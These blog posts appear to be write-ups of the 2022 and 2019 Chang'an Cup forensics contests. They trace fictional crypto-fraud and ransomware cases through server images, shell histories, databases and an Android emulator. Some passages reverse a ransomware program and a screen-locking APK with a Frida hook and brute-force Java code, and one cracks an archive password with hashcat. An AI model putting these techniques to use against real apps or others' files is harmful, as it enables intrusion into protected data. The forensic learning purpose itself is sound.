[{"title":"22年长安杯电子数据取证复盘","url":"/2022/11/06/2022%E9%95%BF%E5%AE%89%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%8D%E7%9B%98/","content":"写在前面最终排名 81/681 二等奖\n第一次正式参加取证比赛，和队友配合不当，多有遗憾。重新复盘一下整个经过，梳理一下取证思路。\n案情背景\n​    某地警方接到受害人报案称其在某虚拟币交易网站遭遇诈骗，该网站号称使用“USTD 币”购买所谓的“HT 币”，受害人充值后不但“HT币”无法提现、交易，而且手机还被恶意软件锁定勒索。警方根据受害人提供的虚拟币交易网站调取了对应的服务器镜像并对案件展开侦查。\n\n检材一部分\n 检材1:根据报案人提供的网站域名和IP，警方调取了对应的服务器镜像“检材1”，分析掌握的检材回答下列问题\n\nip地址：172.16.80.133\n\n检材1的SHA256值为\n将检材1.e01文件拖入火眼当中并选择计算哈希，算法为SHA256\n\n9E48BB2CAE5C1D93BAF572E3646D2ECD26080B70413DC7DC4131F88289F49E34\nPS：这次长安杯两个服务器检材当中历史记录包含了众多有用信息，所以挂载之后第一时间一定要先查看一下历史记录看看都有过什么操作，大致推断一下这个检材是干什么用的\n我们将~/.bash_history存放历史记录的文件导出，查看\n可以得到一些关于网站的信息\n（1）在/web/app目录下曾经启动过jar包，也就是有java应用在后台运行过\n什么是nohup命令？\n\nnohup 英文全称 no hang up（不挂起），用于在系统后台不挂断地运行命令，退出终端不会影响程序的运行。\n\n\n（2）在/web/app/admin目录下，另有npm启动命令。还可以看到一系列vue文件，大致可以推断出这里有网站，且以前端VUE后端java某个框架为架构（在比赛时还以为是nodejs搭建的，一直在找后端代码在哪里…）\n\n（3）在比赛时没注意这里有一个启动脚本，可以一键启动网站的，便于我们重构网站，但是它给删了。\n\n\n\n分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2\n当时的思路是，首先先查看了一下检材一镜像对应的ip\nipconfig\n\n得到172.16.80.133\n搭建该服务器的技术员可能是远程连接上来的，我们看看本机开启了哪些服务\nnetstat -anpt\n\n\n\n可以看到端口22开启了ssh服务，所以可以直接连上来。通过last验证\n\n于是得到了检材2的解压密码 172.16.80.100\n\n检材1中，操作系统发行版本号为\n查看文件/etc/centos-release即可得到\n\n7.5.1804\n\n检材1系统中，网卡绑定的静态IP地址为\n这里我当时是查看网卡里面写的，位于/etc/sysconfig/network-scripts\n\n查看ifcfg-ens33即可得到网卡配置信息\n\n172.16.80.133\n\n检材1中，网站jar包所存放的目录是\n这个我们在历史记录里已经确定了，位于/web/app下\n\njar包分析\n检材1中，监听7000端口的进程对应文件名为\n方法1：当时一个个查看了一下jar包中的配置文件，最终定位到cloud.jar\n从jar包的启动文件可以看出是springboot框架，配置文件在application.properties\n\n方法2：最快速的方法其实就是将jar包全启动起来，然后查看哪个监听的端口是7000就好了\n\n\n检材1中，网站管理后台页面调用的用户表(admin)里的密码字段加密方式为?\n\n分析检材1，网站管理后台登录密码加密算法中所使用的盐值是?\n\n\n后端定位jar包到admin-api.jar，查看配置文件。这里能看到数据库的配置（mysql、mongodb、redis）\n\n\n\n然后发现了可疑的md5 key，推断加密算法可能是md5\n\n因为还没重构出网站，所以我当时还去看了前端代码。结合前端接口我们可以进一步定位controller验证后台登录加密算法\n\n位于/controller/system/EmployeeController#doLogin()\n\n看下md5Key是什么，验证猜想正确\n\n前端部分\n检材1中，网站前台页面里给出的APK的下载地址是\n前台页面的前端在/web/app/web下，其实历史记录中给出了如何跑起来，当时对前后端分离架构还不是很理解。去盲翻前端页面，还真在src/App.vue下找到了一个apk链接，但实际上已经是注释掉了，”二维码链接已修改”\n\n\n于是启动测试一下\nnpm run dev\n\n访问虚拟机3000端口，可以在得到一张二维码图片，扫描即可得到二维码中的apk下载地址\n\n\n\nhttps://pan.forensix.cn/f/c45ca511c7f2469090ad/?dl=1\n\n得到一个apk文件我们先保存下来\n\n检材1中，网站管理后台页面对应的网络端口为\n原来是问的前端启动的端口，后端是在6010（admin-api.jar）\n对于后台的前端我们同样测试一下\n\nnpm run dev\n\n访问虚拟机9090端口，可以验证\n\n\n\n比赛的时候被坑了，我在config配置里看到的是8090。这里是因为npm启动时是直接启动的web-pack打包文件，而非源码（这中间可能会有修改的地方）\n\n或者在检材2中我们可以在浏览器浏览记录里找到后台登录时对应的访问端口\n\n检材2部分\n检材2：根据IP地址落地及后续侦查，抓获了搭建网站的技术员，扣押了其个人电脑并制作镜像“检材2”，分析所有掌握的检材回答下列问题\n\nip地址：172.16.80.100\n\n检材2中，windows账户Web King的登录密码是\n火眼仿真看一下账户信息\n\n135790\n\n检材2中，除检材1以外，还远程连接过哪个IP地址？并用该地址解压检材3\nxshell中可以查看连接会话记录，里面存在两条，另一条就是检材3对应的ip地址172.16.80.133\n\n\n检材2中，powershell中输入的最后一条命令是\n这里存在一个干扰项，就是在火眼分析中的系统SSH 历史输入命令。实际上，仔细看下都是linux命令，对应的是windows下wsl子系统中的命令历史记录，而非powershell中的历史记录，需要特别辨析。\n\n\n\npowershell的历史记录位于分区6\\Users\\Web King\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine下\n查看便可得到 ipconfig\n\n还有一种更直接的方法就是火眼仿真中直接在powershell里按方向键上即可直接得到最后一条历史命令\n\n\n检材2中，下载的涉案网站源代码文件名为 \n在Chrome浏览器的下载历史记录当中有对应几个zip包，以及对应的下载来源\n\n\n\n我们之前在检材一中/web/app/admin和/web/app/web下分别有一个README.md文件，里面对应着github项目下的README.md，通过比对项目https://github.com/sengeiou/ZTuoExchange_framework，可以定位文件就是ZTuoExchange_framework-master.zip\n \n同时在github上我们也找到了网站的架构图\n\n\n检材2中，网站管理后台root账号的密码为\n在登录之后有保存的密码遗留 密码即root\n\n\n检材2中，技术员使用的WSL子系统发行版本是\n静态分析方法：WSL位置一般在C:\\Users\\xxx\\AppData\\Local\\Packages\\CanonicalGroupLimited.xxx_79rhkp1fndgsc\\LocalState\\rootfs下，实际查看会发现有两个版本，其中20.04版本明显文件数量有多很多\n\n并且在20.04版本下的rootfs根文件系统中可以找到清晰的linux目录结构，而在22.04中是不存在的，也就是并未实际使用。\n动态仿真方法：能直观的看到就直观看，打开wsl就能看到\n\n\n检材2中，运行的数据库服务版本号是\n在wsl历史命令当中可以看到有对mysql数据库的操作\n\n在火眼数据库解析当中可以看到8.0.30\n\n\n上述数据库debian-sys-maint用户的初始密码是\n首先什么是debian-sys-maint用户？\n正如它的字面意思（Debian System Matainence），Debian系统对MySQL维护用的，你可以理解为通过系统的某个“非常规”程序对Mysql进行备份恢复等行为时，改程序所使用的登录Mysql的账户。 ——你应该可以理解吧？你手工维护的时候同样需要用某账户登入Mysql再操作的——系统的程序也一样需要这么做，只是它通过这个账户免去了你手工操作的“麻烦”，加深了系统复杂度，让你更加难以理解mysql和Linux的工作原理。 原则上Linux系统本身与MySQL无需任何直接或间接的接触，你大可以删除，维护时使用网上大家最常用的方法来维护（这类方法可以适用于安装在任何系统上的Mysql，而此账户所对应的“便捷”方法——正如他的名字一样，仅适用于Debian）\n在windows中我们是找不到mysql相关的服务的，因为通过历史记录可以看到它是运行在wsl子系统当中\n它的默认密码存放在wsl子系统的/etc/mysql/debian.cnf中\n查看可知初始密码ZdQfi7vaXjHZs75M\n\n\n检材3服务器root账号的密码是\n在wsl历史记录当中可以看到本机有ssh连接检材3的信息，密码就是 h123456\n\n\n\n其中我们再浏览一下本机可以在D盘找到一些脚本文件，这里已经可以看到在检材1中被删掉的start_web.sh，有助于我们重构网站，留住备份。（团队比赛时一定要和队友说明！）\n\n检材三部分\n检材3：根据网站前端和技术员个人电脑上的线索，发现了网站后端所在的服务器IP并再次调证取得“检材3”，分析所有掌握的检材回答下列问题\n\nip地址：172.16.80.128\n检材仿真之后，首先第一时间还是浏览历史记录\n（1）简单看下有zookeeper服务\n\n（2）有docker服务，并且使用了docker-compose插件\n\n（3) 在/web目录下存在启动脚本start.sh，这个我们在检材2里也找到了。同检材1一样，这个启动脚本也被删掉了\n\n\n（4）docker启动了mysql服务\n\n检材3中，监听33050端口的程序名（program name）为\n我们先启动docker服务\nservice docker start\n然后查看网络服务监听状态\nnetstat -lnpt\n\n可知程序名为docker-proxy\n\n除MySQL外，该网站还依赖以下哪种数据库\n在历史记录当中我们是可以看到还有redis和mongo\n\n当然结合检材1的java配置以及我们在github上找到的架构图都是可以判断出的\n\n检材3中，MySQL数据库root账号的密码是\n方法1：在检材1的admin-api.jar配置文件当中，我们是看到了mysql的连接配置信息，直接得到shhl7001\n\n方法2：查看docker-compose配置文件\n通过历史记录看到位于目录/data/mysql/下\n\n\n检材3中，MySQL数据库在容器内部的数据目录为\n从上一题的docker-compose.yml配置文件当中可以看到外部数据映射到了/var/lib/mysql目录下\n或者可以通过查看docker配置判断\ndocker ps# 8eda4cb0b452   mysql:5.7.32docker inspect 8eda4cb0b452\n\n\n涉案网站调用的MySQL数据库名为\n同样在检材1的admin-api.jar配置文件中jdbcUrl为spring.datasource.url=jdbc:mysql://172.16.80.128:33050/b1?characterEncoding=utf-8\n对应数据库名为b1\n\n勒索者在数据库中修改了多少个用户的手机号？\n我们直接在容器外部查看相应日志，对应目录/data/mysql/db\n首先我们找到了8eda4cb0b452.log日志文件，其次发现b1数据库被删掉了，我们把从检材2中找到的b1文件夹复原\n\n然后打开日志文件，可以看到大量的sql执行语句。通过关键词update可以查看到修改用户的相关信息\n\n但是有个坑点在于用户登录时也会出现update数据的操作，需要排除\n\n所以总共有效数据为3条\n\n勒索者在数据库中删除的用户数量为\n同理，全局搜索delete关键词，总共28条数据\n\n\n\n\n还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压检材4\n接下来就是需要网站重构了，我们将检材2中的启动脚本和数据库放到对应的检材目录中\n在检材中，更新docker内的数据库\ndocker-compose up -d\n\n在/web下，首先赋予启动脚本执行权限\nchmod 777 start.sh\n然后启动脚本\nsh start.sh\n\n然后在检材1中/web/app下相同操作\n\n访问网站验证，重构成功！\n\n接下来就是连接数据库查看，在admin表中可以看到 172.16.80.197\n\n\n还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为\n在member_wallet表中，可以看到地址cee631121c2ec9232f3a2f028ad5c89b\n\n\n还原全部被删改数据，共有多少名用户的会员等级为’LV3’\n首先定位会员等级的字段在哪里\n可以看到在member_grade表中，等级分别对应着同数字的id\n\n在member表中存在字段member_grade_id，应该就是与之对应的\n\n这块需要注意之前在日志中看到用户数据有28条是被删除了的，所以我们需要将对应的数据恢复\n数据表中显示最后一条数据id是972，因此我们从973条数据开始恢复\n\n\n\n然后在表中去查询即可\nselect count(*) from member where member_grade_id\n\n\n还原全部被删改数据，哪些用户ID没有充值记录\n首先定位充值记录信息在member_transaction表中可以看到交易记录\n\n联合member表，我们就可以定位哪些用户ID没有充值记录\nselect member.id from member where member.id not in (select distinct (member_transaction.member_id) from member_transaction);\n\n\n\n得到318 989\n\n还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？\n还是在member_transaction表，我们的交易时间对应的字段是create_time\nselect count(*) from member_transaction where create_time like &#x27;%2022-10-17%&#x27;;\n\n\n\n共计1000条\n\n还原全部被删改数据，该网站中充值的USDT总额为\n还是在member_transaction表，我们计算一下总额即可，对应amount字段\nselect SUM(amount) from member_transaction;\n\n也就是408228\n\n\n检材四部分\n检材4.根据前期侦查分析，通过技术手段找到了幕后老板，并对其使用的安卓模拟器“检材4”进行了固定。分析所有掌握的检材，回答下列问题\n\n成功解压后得到了一个.npak格式的文件\n\n经过百度查询可知是V6.0.2.0版本夜神模拟器的备份文件，通过解压可以查看其中的内置备份文件，并存在vmdk后缀文件\n\n\n嫌疑人使用的安卓模拟器软件名称是\n夜神模拟器\n\n检材4中，“老板”的阿里云账号是\n在微信聊天记录里可以找到，往后看我们也能了解到前三个检材背后的剧情，这天聊着聊着就不对劲了。。。\n\n\n检材4中安装的VPN工具的软件名称是\n同样在应用列表可以直接看到 v2rayNG\n\n\n上述VPN工具中记录的节点IP是\n38.68.135.18\n\n\n检材4中，录屏软件安装时间为\n在应用列表中出现了两个无名软件，其中一个的包名十分可疑 com.jiadi.luping\n\n为了求证，我们可以在分区4\\data\\com.jiadi.luping\\databases下查看其数据库信息，定位record.db，同时我们看到还存在wal和shm后缀的文件，这里要简单提到sqlite预写日志的工作方式\n\n\n原始内容保留在数据库文件中，而更改将附加到单独的WAL文件中。甲COMMIT当指示一个提交一个特殊的记录被追加到WAL发生。因此，即使不写入原始数据库也可以进行COMMIT，这允许读者在更改同时提交到WAL的同时继续从原始未更改的数据库进行操作。可以将多个事务附加到单个WAL文件的末尾。\n\n因此如果我们要浏览完整的数据信息，需要同时将这三个文件在同一个目录当中再去打开数据库文件\n可以看到里面确实存放着录屏录像的一些文件\n\n回到本题，安装时间即2022/10/19 10:50:27\n\n上述录屏软件中名为“s_20221019105129”的录像，在模拟器存储中对应的原始文件名为\n在上面record.db数据库文件的RecordFile表中可以找到记录信息\n0c2f5dd4a9bc6f34873fb3c0ee9b762b98e8c46626410be7191b11710117a12d\n\n\n上述录屏软件登录的手机号是\n在AccountInfo表中的mobile字段即登录的手机号 18645091802\n\n\n检材4中，发送勒索邮件的邮箱地址为\n在比赛时队友写成接收地址了。。一定要细心审题\n在QQ邮箱的收件箱中可以看到两封勒索邮件 skterran@163.com\n\n\n\nEXE部分\n分析所有掌握的检材，找到勒索邮件中被加密的文档和对应的加/解密程序，并回答下列问题\n\n在检材二的D盘存在两个可疑文件，其中一个是加密文档，另一个是解密程序，与第二封邮件内容相对应\n\n\n分析加密程序，编译该加密程序使用的语言是\n使用exeinfope查看exe发现程序是pyinstaller生成的可执行文件，于是得出编译该加密程序使用的语言是python\n \n\n分析加密程序，它会加密哪些扩展名的文件？\n阅读代码即可发现在run_finall函数中会对.txt,.jpg,.xls,.docx四种文件进行加密\n\n\n分析加密程序，是通过什么算法对文件进行加密的？\n阅读代码即可发现在run_finall函数中最后调用了XORCBC类的encrypt方法进行了加密\n \n而该encrypt方法对数据进行了异或运算\n \n\n分析加密程序，其使用的非对称加密方式公钥后5位为？\n同样可以在代码中发现publickey如下\npubkey = &#x27;-----BEGIN PUBLIC KEY-----\\nMIIBIzANBgkqhkiG9w0BAQEFAAOCARAAMIIBCwKCAQEAx5JF4elVDBaakgGeDSxI\\nCO1LyyZ6B2TgR4DNYiQoB1zAyWPDwektaCfnvNeHURBrw++HvbuNMoQNdOJNZZVo\\nbHVZh+rCI4MwAh+EBFUeT8Dzja4ZlU9E7jufm69TQS0PSseIiU/4Byd2i9BvIbRn\\nHLFZvi/VXphGeW0qVeHkQ3Ll6hJ2fUGhTsuGLc1XXHfiZ4RbJY/AMnjYPy9CaYzi\\nSOT4PCf/O12Kuu9ZklsIAihRPl10SmM4IRnVhZYYpXedAyTcYCuUiI4c37F5GAhz\\nRDFn9IQ6YQRjlLjuOX8WB6H4NbnKX/kd0GsQP3Zbogazj/z7OM0Y3rv3T8mtF6/I\\nkwIEHoau+w==\\n-----END PUBLIC KEY-----\\n&#x27;\n\n被加密文档中，FLAG1的值是\n同样对decrypt_file.exe进行解包与反编译后发现解密需要的密码明文写在了程序中\n \n执行decrypt_file.exe并输入密码\n \n得到解密后的文档,FLAG就在文档中\n \n\n\nAPK部分\n分析所有掌握的检材，找到报案人描述的加密勒索apk程序，分析并回答下列问题\n\n加密勒索apk程序我们在检材1的二维码链接中可以下载得到\n\n\n恶意APK程序的包名为\n直接利用雷电APP智能分析就能查看\n cn.forensix.changancup\n\n\nAPK调用的权限包括\n在静态权限当中可以查看\n\n\n解锁第一关所使用的FLAG2值为\n雷电模拟器安装上apk，打开软件查看。很好，模拟器被锁了。\n\n将其脱壳，反编译。然后查看代码，先全局搜索一下关键词FLAG\n大致看下逻辑，其中OnClick函数这里有个明显的字符串对比，trim2是我们的输入\n\n\n解锁第二关所使用的FLAG3值为\n接上题，注意到\n\n追踪App.OooO0O0.OooO0oo，发现在这里被初始化\n\n\n\n尝试用frida进行hook，模拟器先把frida-server开起来（注意不要给ZTuoExchange root权限），跑脚本frida -U -l hook.js &quot;ZTuoExchange&quot;\n\nhttps://blog.csdn.net/WXjzcccc/article/details/127609236\n\nsetImmediate(function () &#123;    Java.perform(function () &#123;        var app = Java.use(&quot;cn.forensix.cab.App&quot;);  // 指定类        var OooO0oo = app.class.getField(&quot;OooO0oo&quot;);  // 指定属性        var OooO0O0 = app.class.getField(&quot;OooO0O0&quot;).get(null);  // 获取已实例化的对象        console.log(OooO0oo.get(OooO0O0));    &#125;);&#125;)\n\n解锁第三关所需的KEY值由ASCII可显示字符组成，请请分析获取该KEY值\n\n关键的验证\n\n查看该函数声明，要求字符串长度为24，4个一组，分成6组操作。其中try块里会触发unused异常，真正的验证逻辑在catch块中。可以把需要用到的操作拿出来，每4个进行爆破。\n\nclass Main &#123;    private static int[] OooO0oO = &#123;1197727163, 1106668241, 312918615, 1828680913, 1668105995, 1728985987&#125;;    public static void main(String[] args) &#123;        for (int n=0; n&lt;6; n++) &#123;            boolean flag = false;            for (int i = 0x20; i &lt; 0x7f; i++) &#123;                for (int j = 0x20; j &lt; 0x7f; j++) &#123;                    for (int k = 0x20; k &lt; 0x7f; k++) &#123;                        for (int l = 0x20; l &lt; 0x7f; l++) &#123;                            long tmp = (long) (i &lt;&lt; 16);                            tmp |= (long) (j &lt;&lt; &#x27;\\b&#x27;);                            tmp |= (long) (k &lt;&lt; 24);                            tmp |= (long) l;                            if (((OooO(tmp, 4294967296L)[0] % 4294967296L) + 4294967296L) % 4294967296L == ((long) OooO0oO[n])) &#123;                                System.out.print((char) i);                                System.out.print((char) j);                                System.out.print((char) k);                                System.out.print((char) l);                                flag = true;                                break;                            &#125;                        &#125;                        if (flag)                            break;                    &#125;                    if (flag)                        break;                &#125;                if (flag)                    break;            &#125;        &#125;     &#125;    public boolean OooO0O0(String str) &#123;        if (str.length() != 24) &#123;            return false;        &#125;        long[] jArr = new long[6];        for (int i = 0; i &lt; str.length() / 4; i++) &#123;         int i2 = i * 4;         jArr[i] = (long) (str.charAt(i2) &lt;&lt; 16);         jArr[i] = jArr[i] | ((long) (str.charAt(i2 + 1) &lt;&lt; &#x27;\\b&#x27;));         jArr[i] = jArr[i] | ((long) (str.charAt(i2 + 2) &lt;&lt; 24));         jArr[i] = ((long) str.charAt(i2 + 3)) | jArr[i];//         PrintStream printStream = System.out;//         printStream.println(&quot;buildKey:i:&quot; + i + &quot;,value:&quot; + jArr[i]);         &#125;        try &#123;            int[] iArr = &#123;1197727043, 1106668192, 312918557, 1828680848, 1668105873, 1728985862&#125;;            Object[] objArr = &#123;&#x27;x&#x27;, &#x27;1&#x27;, &#x27;:&#x27;, &#x27;A&#x27;, &#x27;z&#x27;, &#x27;&#125;&#x27;&#125;;            for (int i3 = 0; i3 &lt; 6; i3++) &#123;                if (((long) iArr[i3]) - jArr[i3] != ((long) ((Integer) objArr[i3]).intValue())) &#123;                    return false;                &#125;            &#125;            return true;        &#125; catch (Exception unused) &#123;             for (int i4 = 0; i4 &lt; 6; i4++) &#123;                 if (((OooO(jArr[i4], 4294967296L)[0] % 4294967296L) + 4294967296L) % 4294967296L != ((long) this.OooO0oO[i4])) &#123;                     return false;                 &#125;             &#125;            return true;        &#125;    &#125;     private static long[] OooO(long j, long j2) &#123;         if (j == 0) &#123;             return new long[]&#123;0, 1&#125;;         &#125;         long[] OooO = OooO(j2 % j, j);         return new long[]&#123;((j2 / j) * OooO[0]) + OooO[1], OooO[0]&#125;;     &#125; &#125;\n答案：a_asd./1imc2)dd1234]_+=+\n","tags":["电子数据取证"]},{"title":"19年长安杯电子数据取证复现","url":"/2022/10/17/19%E5%B9%B4%E9%95%BF%E5%AE%89%E6%9D%AF%E5%A4%8D%E7%8E%B0/","content":"案情简介在一起电诈案件中，受害者称自己的银行卡被他人冒用，曾收到假冒公安的短信，因为自己在一个 P2P 网站中理财，假冒公安称该网站已被列外非法网站，要自己到公安备案网站填写自己的信息，并帮助自己追回本金，因此信以为真，在网站上填写了自己的信息和绑定的银行卡信息；办案机关推测嫌疑人可能是获取了 P2P 网站中的注册用户信息，从而进行定向诈骗，因此调取了 P2P 理财网站的服务器，现委派你对该服务器进行电子数据取证。\n检材一\n你获得该 P2P 理财网站服务器硬盘镜像文件“检材 1.E01”，根据这个镜像文件，回答下列问题\n\n\n\n\n5EE0B3809807BF8A39453695C5835CDDFD33F65B4F5BEE8B5670625291A6BC1C-&gt;  C\n\n\n\n火眼中查看即可知 CentOS Linux release 7.6.1810 (Core) -&gt; D\n\n\n\nuname -a\n\nA\n\n\n\nfdisk -l\n\nB\n\n\n\n关于LVM\n上图可知LVM分区从2099200开始 -&gt; C\n\n\n\n火眼证据里面分区详情有对此的描述 D\n\n如果不确定分区0和分区1，可以在仿真中查看LVM逻辑卷的详细信息\nlvdisplay\n\n\n\n\n前面我们已经知道了root逻辑卷的扇区数为35643392，每个扇区数为512byte，相乘得到18,249,416,704 -&gt; C\n\n\n\n首先看下对外开的端口，有docker\n\n看下是否有正在运行的docker\n\n有个映射到80的，并且内部服务中间件为nginx，可以大致确定外端口应该就是8091 -&gt; D\n\n\n\ndocker images | wc -l\n\nC 错了错了，还得去掉表头 应该是B\n\n\n\ndocker version\n\nC\n\n\n\ndocker ps -a | wc -l\n11 -1 = 10 -&gt; A\n\n\n\nC\n或者可以直接docker info一目了然\n\n\n\n\n\nD\n\n\n\nB 错了错了。。 仔细看这个容器并没有外映射主机端口 D\n\n\n\n\n根据COMMAND和端口可以推断出是ssh -&gt; B\n\n\n\n找外映射是39999 -&gt; C\n\n\n\n\nC\n\n\n\n根据容器的IMAGE找镜像 -&gt;  D\n\n\n\n\nB\n\n\n\nssh的排除一下，16的里面就是个空nginx\n可以定位到53里面\ndocker exec -it 53 /bin/bash\n\nB\n\n\n\n针对docker文件结构 参考羊学长http://www.ga1axy.top/index.php/archives/65/\ndocker inspect 53\n​    根据学长的说明，应该就是指的GraphDriver字段中对应的UpperDir层 \n\nA\n\n\n\nnginx常见日志路径/var/log/nginx，但这道题不是\n一个个找，可以发现是 C\n\n\n\n\n\n在后面日志host中可以看到（结合端口号）192.168.184.128  后面看着像是在猜密码（案情提到了嫌疑人应该是拿到了网站注册用户信息）-&gt; D\n\n\n\n网络模式详解：https://www.cnblogs.com/zuxing/articles/8780661.html\n同样，我们还是可以通过下面命令中的Networks字段来定位连接模式\ndocker inspect 53\n\n53容器是bridge\n我们来观察详细的桥接模式信息\ndocker network inspect bridge\n\nA\n\n\n\nB ??? 不太懂逻辑\n\n\n\n刚才日志的头部即可看到 C    \n\n\n\n\n所以应该是 A\n错了错了，既然是nodejs起的Web服务，那么应该就是server/index.js。原来config下的那个是vue的配置文件\n有个README文件，可以看到一些提示\n\n\n\n\nC\n\n\n在/server/db.js中可以看到 D\n\n\n\n\n\n同上 D\n\n\n\n同上 A\n\n\n\n同上 D\n\n\n\n同上 B\n\n\n\n这一般就是查看shell的历史记录，默认写入~/.bash_history（注意有好几个.bash_history，要的是主机里的）\n\n可以看到加密的就是自己 A\n\n你获得了该 P2P 理财网站数据库服务器硬盘镜像文件“检材 2.E01”，根据这个镜像文件，回答下列问题\n\n检材二mongodb\n# mongodb.conf/etc/mongod.conf# 数据库文件位置dbpath=/var/lib/mongodb#日志文件的路径logpath=/var/log/mongodb/mongodb.log\n\n\n\n我们已经知道了数据库是mongodb \n默认数据文件路径 /var/lib/mongodb/ \n\nD\n\n\n\nC\n\n\n\n从配置文件可以找 -&gt; C\n\n启动mongo服务\nmongod --dbpath /var/lib/mongo\n\n\n\n数据库中找不到任何东西，只能从日志分析入手。直接看感觉好乱，配合一下检材一的代码\n\n首先关注一下api.js中给出的登录/注册业务代码，存在username和password字段，并且结合前面服务器的ip\n\n由此我们定位到了用户表名为user\n\n\n\n结合前面注册用户时取出的数据校验方式可知没有加解密，而是直接进行的比较，因此未加密 -&gt; A\n\n\n\n\n可以看到用户表，被修改过用户密码 -&gt; B\n\n\n\n直接全局搜索针对数据库的操作，删库db.dropDatabase() -&gt; C\n\n\n\n\nD\n\n\n\n这个看日志贼烦，换个思路，直接去看登录所在服务器的时间即可。嫌疑人的ip是192.168.184.133\n\nD\n\n\n\n18:09:37.393+0800 -&gt; A\n检材三\n经调查，你扣押获得了一台嫌疑人使用过的 VPN 服务器，并用服务器硬盘制作成“检材 3.E01”镜像文件，根据该镜像文件，回答下列问题\n\n\n\n\n在历史记录中可以找到启动的协议服务 -&gt; B\n\n\n\n\ntimedatectl\n\nD\n\n\n\n同样直接在历史记录里找 -&gt; A\n\n\n\n\n肯定在配置文件中记录了（得细心看注释。注意，配置文件应该是/etc/pptd.conf（非option那个\n\n并且为了验证，我们可以去看一下wtmp文件的访问记录，确实有ppp协议的访问\n\n\n\n\n\nB\n\n\n\n这会看的才是option文件 -&gt; D\n\n\n\n\n巧了，历史记录也有 C\n\n\n\n这个就得去日志里翻一下了，时间已经给出来了 -&gt; A\n\n\n\n\n白给，D\n\n\n\nnnd，是题目写错了，应该是172.16.80.188 那就直接是B\n\n\n\n\n还是得看日志\n注意是北京时间，我们所在时区与北京时区相比慢2小时，所以需要+2\n\nD\n\n\n\n这个还是看历史记录，直接定位效率比较高 -&gt; B\n\n\n\n\n\n还要保存下来，看看那个被rm了\n\n两个相比对，可以知道是D\n\n\n\n最后保存下来的有两个数据包，都是是基于tcp协议，我们都看一眼\n\n\n\n\n呜呜不太会wireshark，大致搜了一下，A\n\n\n你抓获了嫌疑人，并扣押了嫌疑人笔记本电脑，制作笔记本硬盘镜像文件“检材 4.E01”，请根据镜像文件，回答下列问题\n\n\n\n\n火眼仿真镜像，可以看到账户信息\n\n对于哈希，直接计算即可1E646DEC202C96B72F13CC3CF224148FC4E19D6FAAAF76EFFFC31B1CA2CDD200 D\n\n\n\n\nA\n\n\n\n\nC\n\n\n\n\nC\n\n\n\n\nA\n\n\n\n\n桌面上有三个软件，点开看看就知道 -&gt; A\n\n\n结合一下 -&gt; D\n\n\n\n\n\n\n​    \n\nD\n\n\n\n\nD\n更准确的话应该去浏览器历史记录里找（不一定 但是这次是在谷歌历史记录里有\n\n\n\n\nA\n\n\n\n连接至服务器应该就是用的xshell，我们在其中可以找到会话文件\n\n然后去定位一下该文件的活动时间即可 -&gt; A\n\n\n\n\n\n时间上很相近 B\n\n用修改时间去减去创建时间吧？ C\n\n\n\n有点坑，文件显示路径在D盘，但是仿真以后发现D盘都没了。。。\n这道题得去源IP服务器上找到那个文件再计算哈希。。（在检材一\n\n077D894557EDF44E5792E0214E0F1C46B9B615BE11AC306BCCE2AF9D666F47D5 -&gt; D\n\n\n\n找到一个ios备份\n\n提取出来分析，竟然还要密码，桌面上一直有个便签排上用场了\n\n\nC\n\n\n\n\nB\n\n\n\n\n\nA\n\n\n1649840939 -&gt; A\n\n\n\n\n\nC\n\n\n\n\n一个是880，一共两笔交易，那就是买了两个 -&gt; B\n两个软件的下载链接\n\n另一个是加密程序\n\n\n\n\n\n\n\n\nD\n\n\n\n\nC\n\n\n\n思路突然断了，回去看看题干受害者称自己的银行卡被他人冒用，曾收到假冒公安的短信，想起来了，nnd这么多题，前面都快忘了\n\nC\n\n\n\n这个肯定是在另一台设备上了，备份软件上还有虚拟机的文件，打开后看下历史记录，可以发现这个设备上有个网站\n\n看到存在数据库文件，导出来看看\n\n打开以后发现信息不全，感觉是没恢复快照的缘故，因为我们可以知道受害者的手机号，但是和数据库匹配不上\n\n\n好麻烦，不太会搞&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;\n\n\n\n回到刚才的浏览器历史记录 -&gt; C\n\n从时间线看也是这样\n\n\n\n\n考的都是回忆，之前xshell有过会话建立文件，且也有密钥文件\n\n时间上相近，且连接确实建立了，说明用的就是 B\n\n\n\n确实是综合题，转头还要看以前的线索。这道题的线索在嫌疑人的vpn服务器上，他曾经抓过数据包，那么发邮件的话肯定会走代理，也就会被截取到，怪不得有两个数据报，前面那个没啥tcp信息\n可以看到时间为 A\n\n\n\n\n\n上题 B\n\n\n\n这个就很难了，所有能重构网站的线索都是分散的，我们只能靠着wp一点点来呜呜呜\n首先存放网站的镜像在检材4的C盘底下，经过了bitLocker加密\n\n\nBitLocker为我们第一个需要的文件，首先在火眼分析上找发现源文件已不在，因而我们的思路转变为找密钥文件\n\n在QQ消息中有个线索，因此我们知道了密钥文件一定是备份了另存在其他地方，结合邮件那就能确定肯定是邮件发出去了，那我们就把邮件导出来\n\n\n以IMF的方式导出文件，得到了四个EML格式的文件\n\n\n打开后其中有一个邮件附带了密钥文件，下载下来，解压，发现还需要解压密码。。。\n\n\n那么思路继续转为解压缩包，其中检材4的另一个线索给了我们，也就是桌面上的字典文件，拿个工具跑一下\n\n\n工具爆破压缩包\n\n\n网上下不到什么好的win爆破软件（全是收费+广告），最后还得靠kali\nhttps://blog.csdn.net/weixin_46081055/article/details/119594510\n这里利用hashcat+rar2john破解\n首先通过rar2john将rar中的密码哈希提取出来，可以看到hash算法是RAR5\n\n然后就是用hashcat配合我们的字典爆破，nnd 